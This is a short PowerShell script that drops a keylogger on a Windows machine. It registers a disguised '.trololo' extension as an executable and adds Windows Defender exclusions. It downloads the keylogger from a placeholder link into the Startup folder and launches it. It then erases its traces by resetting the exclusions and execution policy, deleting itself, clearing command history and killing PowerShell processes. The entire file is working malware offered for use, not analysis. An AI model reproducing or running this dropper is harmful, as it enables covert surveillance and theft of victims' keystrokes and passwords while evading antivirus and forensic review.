Set-Location $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup #Go to the folder in which we will donwload files
cmd /c C:\Windows\System32\reg.exe add HKLM\Software\Classes\.trololo /ve /d "exefile" /f
Add-MpPreference -ExclusionExtension trololo -Force #Add exception for .exe files in antivirus
Invoke-WebRequest LINK -O keylogger.trololo #Download keylogger script
Add-MpPreference -ExclusionPath $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup\keylogger.trololo -Force #Add exception for keylogger.exe file in antivirus
Start-Process keylogger.trololo #Start keylogger script
Remove-MpPreference -ExclusionExtension trololo -Force #Reser .exe files exception in antivirus
Remove-MpPreference -ExclusionExtension ps1 -Force #Reset .ps1 files exception in antivirus
Set-ExecutionPolicy restricted -Force #Reset script execution policy
Remove-Item C:\Users\Public\Documents\startScript.ps1 #Delete ps1 script
Clear-Content (Get-PSReadlineOption).HistorySavePath #Clear powershell command history
taskkill -F /IM powershell.exe #Kill all powershell process
